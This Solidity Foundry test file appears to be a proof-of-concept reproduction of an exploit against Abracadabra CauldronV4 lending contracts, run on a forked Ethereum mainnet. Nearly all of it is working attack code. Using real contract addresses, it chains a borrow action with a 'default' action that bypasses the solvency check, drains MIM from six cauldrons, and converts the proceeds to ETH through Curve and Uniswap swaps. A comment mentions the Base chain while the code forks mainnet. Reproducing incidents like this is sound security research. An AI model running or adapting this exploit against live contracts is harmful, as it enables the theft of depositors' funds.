// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

interface IDegenBox {
    function toAmount(IERC20, uint256, bool) external view returns (uint256);
    function balanceOf(IERC20, address) external view returns (uint256);
    function withdraw(
        IERC20 token_,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface IPrivilegedCheckpointCauldronV4 {
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256 value1, uint256 value2);
}

interface IExchange {
    function exchange(
        address[11] calldata _route,
        uint256[5][5] calldata _swap_params,
        uint256 _amount,
        uint256 _min_dy,
        address[5] calldata _pools,
        address _receiver
    ) external returns (uint256);
}

contract AbracadabraV4PoC is Test {
    ExploitContract exploitContract;
    constructor() {
        // Fork Base chain at block just before the exploit
        vm.createSelectFork("mainnet", 23504546 - 1);

        exploitContract = new ExploitContract();
    }

    function testExploit() public {
        exploitContract.exploit();
    }
}

contract ExploitContract {
    IDegenBox degenBox;
    IERC20 MIM;
    address[] cauldrons = new address[](6);
    IExchange exchange;
    VyperContract crvToken;
    IERC20 DAI;
    VyperContract DAI_USD_POOL;
    IERC20 USDC;
    Uni_Router_V3 swapRouter;
    WETH weth;
    USDT usdt;

    address cauldron0 = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address cauldron1 = 0x289424aDD4A1A503870EB475FD8bF1D586b134ED;
    address cauldron2 = 0xce450a23378859fB5157F4C4cCCAf48faA30865B;
    address cauldron3 = 0x40d95C4b34127CF43438a963e7C066156C5b87a3;
    address cauldron4 = 0x6bcd99D6009ac1666b58CB68fB4A50385945CDA2;
    address cauldron5 = 0xC6D3b82f9774Db8F92095b5e4352a8bB8B0dC20d;

    constructor() {
        degenBox = IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
        MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
        cauldrons[0] = cauldron0;
        cauldrons[1] = cauldron1;
        cauldrons[2] = cauldron2;
        cauldrons[3] = cauldron3;
        cauldrons[4] = cauldron4;
        cauldrons[5] = cauldron5;

        exchange = IExchange(0x45312ea0eFf7E09C83CBE249fa1d7598c4C8cd4e);
        crvToken = VyperContract(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
        DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        DAI_USD_POOL = VyperContract(
            0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7
        );
        USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        swapRouter = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        usdt = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    }

    function exploit() external {
        uint8[] memory actions = new uint8[](2);
        actions[0] = 5; // borrow action
        actions[1] = 0; // default action, this action is make bypass solvency check
        uint256[] memory values = new uint256[](2);
        values[0] = 0;
        values[1] = 0;

        uint256 balance = 736232217688141260022912;

        for (uint i = 0; i < 6; i++) {
            if (i != 0) {
                balance = degenBox.balanceOf(MIM, cauldrons[i]);
            }
            uint256 shareAmount = degenBox.toAmount(MIM, balance, false);

            bytes[] memory datas = new bytes[](2);
            datas[0] = abi.encode(shareAmount, address(this)); // borrow 1 million MIM
            datas[1] = abi.encode(); // default action data

            IPrivilegedCheckpointCauldronV4(cauldrons[i]).cook(
                actions,
                values,
                datas
            );
        }

        balance = degenBox.balanceOf(MIM, address(this));
        console.log("MIM balance:", balance / 1e18);

        degenBox.withdraw(MIM, address(this), address(this), 0, balance);

        uint256 finalBalance = MIM.balanceOf(address(this));
        console.log("Final MIM balance:", finalBalance / 1e18);

        MIM.approve(address(exchange), type(uint256).max);

        address[11] memory route = [
            address(MIM),
            0x5a6A4D54456819380173272A5E8E9B9904BdF41B,
            0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490,
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0)
        ];

        uint256[5][5] memory swap_params;
        swap_params[0] = [uint256(0), 1, 1, 1, 2];
        swap_params[1] = [uint256(0), 0, 0, 0, 0];
        swap_params[2] = [uint256(0), 0, 0, 0, 0];
        swap_params[3] = [uint256(0), 0, 0, 0, 0];
        swap_params[4] = [uint256(0), 0, 0, 0, 0];

        exchange.exchange(
            route,
            swap_params,
            finalBalance,
            0,
            [
                0x5a6A4D54456819380173272A5E8E9B9904BdF41B,
                address(0),
                address(0),
                address(0),
                address(0)
            ],
            address(this)
        );

        uint256 crvBalance = crvToken.balanceOf(address(this));
        console.log("CRV balance:", crvBalance / 1e18);

        DAI_USD_POOL.remove_liquidity(crvBalance, [uint256(0), 0, 0]);

        uint256 daiBalance = DAI.balanceOf(address(this));
        console.log("DAI balance:", daiBalance / 1e18);

        DAI.approve(address(exchange), type(uint256).max);

        route[0] = address(DAI);
        route[1] = address(DAI_USD_POOL);
        route[2] = address(USDC);

        exchange.exchange(
            route,
            swap_params,
            daiBalance,
            0,
            [
                address(DAI_USD_POOL),
                address(0),
                address(0),
                address(0),
                address(0)
            ],
            address(this)
        );

        uint256 usdcBalance = USDC.balanceOf(address(this));
        console.log("USDC balance:", usdcBalance / 1e6);

        USDC.approve(address(swapRouter), type(uint256).max);

        Uni_Router_V3.ExactInputParams memory params = Uni_Router_V3
            .ExactInputParams({
                path: abi.encodePacked(
                    address(USDC),
                    uint24(500),
                    address(weth)
                ),
                deadline: block.timestamp,
                recipient: address(this),
                amountIn: usdcBalance,
                amountOutMinimum: 0
            });

        swapRouter.exactInput(params);

        uint256 wethBalance = weth.balanceOf(address(this));
        console.log("WETH balance:", wethBalance / 1e18);

        uint256 usdtBalance = usdt.balanceOf(address(this));
        console.log("USDT balance:", usdtBalance / 1e6);

        usdt.approve(address(swapRouter), type(uint256).max);
        params = Uni_Router_V3.ExactInputParams({
            path: abi.encodePacked(address(usdt), uint24(500), address(weth)),
            deadline: block.timestamp,
            recipient: address(this),
            amountIn: usdtBalance,
            amountOutMinimum: 0
        });

        swapRouter.exactInput(params);
        wethBalance = weth.balanceOf(address(this));
        console.log("Final WETH balance:", wethBalance / 1e18);

        weth.withdraw(wethBalance);
        console.log("Final ETH balance:", address(this).balance / 1e18);
    }

    receive() external payable {}
}
